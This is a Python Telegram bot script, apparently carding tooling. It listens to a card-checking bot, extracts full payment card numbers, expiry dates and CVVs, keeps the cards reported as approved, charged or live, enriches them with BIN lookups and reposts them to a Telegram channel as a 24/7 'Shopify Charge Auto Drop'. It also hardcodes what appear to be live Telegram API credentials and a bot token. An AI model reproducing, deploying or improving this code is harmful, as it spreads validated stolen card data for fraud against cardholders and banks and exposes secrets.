import re
import aiohttp
import logging
from pyrogram import Client, filters
from pyrogram.enums import ParseMode
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

# === CONFIGURATION ===
API_ID = 28232616
API_HASH = "82e6373f14a917289086553eefc64afe"
BOT_TOKEN = "8463287566:AAEHL1B2iCL0EcTpKN9soRKncHMAudBuAvs"

CARD_CHECK_BOT_ID = 5366864997  # The bot that checks cards
TARGET_CHANNELS = ["@hybuabu"]  # Your channel(s)

# Track processed messages
processed_ids = set()  # Track by message ID instead of CC number
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# ======================

app = Client("card_tracker", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

async def get_bin_data(bin_code):
    """Enhanced BIN lookup with better error handling"""
    url = f"https://bins.antipublic.cc/bins/{bin_code}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return [
                        bin_code,
                        data.get("country", "Unknown"),
                        data.get("bank", "Unknown"),
                        data.get("type", "Unknown"),
                        data.get("level", "Unknown")
                    ]
                logging.warning(f"BIN API responded with status {resp.status}")
    except Exception as e:
        logging.error(f"BIN lookup failed: {str(e)}")
    return [bin_code, "Unknown", "Unknown", "Unknown", "Unknown"]

def parse_card_info(text):
    """More robust parsing that handles multiple formats"""
    patterns = [
        r'(?:Card|CC):?\s*(\d{13,19})[| ](\d{1,2})[| ](\d{2,4})[| ](\d{3,4})',
        r'(\d{13,19})[| ](\d{1,2})[| ](\d{2,4})[| ](\d{3,4})'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            cc, month, year, cvv = match.groups()
            # Standardize the CC format
            return f"{cc}|{month}|{year}|{cvv}"
    return None

def parse_response(text):
    """Extract status and response from various formats"""
    text = text.replace('\n', ' ').replace('\r', ' ')  # Normalize newlines
    
    status = "N/A"
    response = "N/A"
    
    # Try different patterns for status
    status_matches = re.finditer(r'(Status|STATUS|Result):?\s*(.+?)(?:\s*(?:Response|RESPONSE)|$)', text, re.IGNORECASE)
    for match in status_matches:
        status = match.group(2).strip()
    
    # Try different patterns for response
    response_matches = re.finditer(r'(Response|RESPONSE|Message):?\s*(.+?)(?:\s*(?:Time|Took)|$)', text, re.IGNORECASE)
    for match in response_matches:
        response = match.group(2).strip()
    
    return status, response

def should_process(response):
    """Determine if we should forward this card"""
    response = (response or "").upper()
    keywords = ["APPROVED", "CHARGED", "INSUFFICIENT", "SUCCESS", "LIVE"]
    return any(keyword in response for keyword in keywords)

async def send_to_channels(formatted_text):
    """Handle sending to all channels with error handling"""
    buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔄 Scraper", url="https://t.me/ApprovedScrapper1"),
            InlineKeyboardButton("📦 Backup", url="https://t.me/YourBackupChannel")
        ]
    ])
    
    for channel in TARGET_CHANNELS:
        try:
            await app.send_message(
                chat_id=channel,
                text=formatted_text,
                parse_mode=ParseMode.HTML,
                reply_markup=buttons
            )
            logging.info(f"Successfully sent to {channel}")
            return True
        except Exception as e:
            logging.error(f"Failed to send to {channel}: {str(e)}")
    return False

@app.on_message(filters.user(CARD_CHECK_BOT_ID) & ~filters.edited)
async def handle_card_check(client, message: Message):
    try:
        # Skip if we've already processed this message
        if message.id in processed_ids:
            return
        processed_ids.add(message.id)
        
        text = message.text or message.caption or ""
        logging.info(f"Processing message: {text[:100]}...")
        
        # Skip "wait" messages
        if "wait" in text.lower() or "checking" in text.lower():
            logging.debug("Skipping 'wait' message")
            return
        
        # Parse card info
        card_str = parse_card_info(text)
        if not card_str:
            logging.debug("No card info found in message")
            return
        
        # Parse status and response
        status, response = parse_response(text)
        if not should_process(response):
            logging.debug(f"Skipping card with response: {response}")
            return
        
        # Extract components from card string
        cc, month, year, cvv = card_str.split('|')
        bin_code = cc[:6]
        
        # Get BIN info
        bin_info = await get_bin_data(bin_code)
        logging.info(f"BIN info retrieved: {bin_info}")
        
        # Format the message
        formatted_text = (
            "𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗖𝗵𝗮𝗿𝗴𝗲 𝗔𝘂𝘁𝗼 𝗗𝗿𝗼𝗽 24/7\n\n"
            f"𝗖𝗖: <code>{cc}|{month}|{year}|{cvv}</code>\n"
            f"𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {response}\n\n"
            f"𝗕𝗶𝗻: <code>{bin_code}</code>\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <code>{bin_info[1]}</code>\n"
            f"𝗕𝗮𝗻𝗸: <code>{bin_info[2]}</code>\n"
            f"𝗧𝘆𝗽𝗲: <code>{bin_info[3]}</code>\n"
            f"𝗟𝗲𝘃𝗲𝗹: <code>{bin_info[4]}</code>\n\n"
            "𝗣𝗿𝗼𝘃𝗶𝗱𝗲𝗱 𝗯𝘆: 𝗕𝘂𝗻𝗻𝘆"
        )
        
        # Send to channels
        if await send_to_channels(formatted_text):
            logging.info("Card successfully processed and forwarded")
        else:
            logging.error("Failed to send to all channels")
            
    except Exception as e:
        logging.error(f"Error processing message: {str(e)}")

# === START BOT ===
logging.info("Starting Card Tracker Bot...")
app.run()
